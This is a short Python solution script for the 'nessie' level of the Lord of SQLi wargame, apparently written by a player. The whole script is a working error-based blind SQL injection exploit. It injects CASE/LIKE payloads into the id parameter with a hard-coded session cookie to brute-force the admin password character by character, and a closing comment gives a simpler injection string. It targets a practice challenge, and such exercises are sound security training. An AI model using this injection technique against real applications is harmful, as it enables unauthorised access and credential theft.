# lordofsqli: nessie
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/nessie_7c5b5d8119ce2951f2a4f2b3a1824dd2.php'
cookies = {'PHPSESSID': 'tn610bhfuga5petuu89p999kpl'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        print(c, end='', flush=True)

        payload = {'id': f"admin' and 1=(case when pw like '{passwd + c}%' then 'a' end)--"}
        r = requests.get(url, payload, cookies=cookies)
    
        if 'Error' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break

print('\n->' + passwd)

# easier soltion: ?id=admin' and pw=1--
